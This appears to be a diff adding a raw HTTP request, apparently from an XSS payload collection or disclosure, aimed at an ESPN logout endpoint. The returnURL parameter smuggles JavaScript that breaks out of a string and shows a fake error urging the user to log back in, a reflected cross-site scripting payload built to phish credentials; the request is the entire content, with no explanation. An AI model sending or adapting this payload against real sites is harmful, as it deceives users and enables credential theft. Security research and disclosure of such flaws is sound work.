@@ -1,0 +1,2 @@
+GET /dynamic/iamLRR/LrrController?IAM_OP=logout&returnURL=http://www.espn.com%22;alert(%22An%20Error%20Occurred%20While%20Processing%20your%20request.%20Please%20log%20back%20in.%22);varstrings=%22test HTTP/1.1
+Accept: text/html
